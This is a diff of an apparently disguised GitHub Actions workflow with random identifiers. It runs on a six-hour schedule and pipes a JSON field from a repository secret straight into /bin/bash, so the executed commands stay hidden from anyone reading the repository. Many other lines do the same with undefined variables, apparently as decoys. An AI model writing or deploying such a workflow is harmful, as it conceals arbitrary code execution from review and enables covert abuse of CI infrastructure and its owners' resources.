@@ -1,23 +1,36 @@
 name: ahfahhil
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '57 2/6 * * *'
-jobs:  # 3035
+    - cron: '37 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: ahfahhil
         env:
-          n94: ${{ secrets.n94 }}
+          z54: ${{ secrets.z54 }}
         run: |
-          echo $n94 | jq -r .krttt65 | /bin/bash
-          echo $v321 | jq -r .yn34 | /bin/bash
-          echo $otyt7724 | jq -r .vrm1 | /bin/bash
-          echo $ajhpb26716 | jq -r .spfc8 | /bin/bash
-          echo $tj9 | jq -r .nvjmd611 | /bin/bash
-          echo $gxaf53 | jq -r .b378 | /bin/bash
-          echo $ny2934 | jq -r .yrmg52 | /bin/bash
-          echo $ntdq501 | jq -r .hvh7 | /bin/bash
+          echo $z54 | jq -r .ku02 | /bin/bash
+          echo $zzejz7 | jq -r .p64973 | /bin/bash
+          echo $qrbe912 | jq -r .p5980 | /bin/bash
+          echo $g88956 | jq -r .z9 | /bin/bash
+          echo $byz577 | jq -r .g65 | /bin/bash
+          echo $a26728 | jq -r .ar22182 | /bin/bash
+          echo $pp14087 | jq -r .c627 | /bin/bash
+          echo $wmsle29983 | jq -r .onomo84 | /bin/bash
+          echo $svu3 | jq -r .qdlw428 | /bin/bash
+          echo $w594 | jq -r .uld19599 | /bin/bash
+          echo $lidvh5866 | jq -r .dpfl53 | /bin/bash
+          echo $ys17433 | jq -r .djs62 | /bin/bash
+          echo $w38 | jq -r .gmdes1 | /bin/bash
+          echo $bdo7 | jq -r .dcfj551 | /bin/bash
+          echo $od78 | jq -r .pldw8 | /bin/bash
+          echo $fqvb8043 | jq -r .npq06107 | /bin/bash
+          echo $vx05 | jq -r .vum3 | /bin/bash
+          echo $osjp69934 | jq -r .ob798 | /bin/bash
+          echo $ezcb706 | jq -r .ril7 | /bin/bash
 
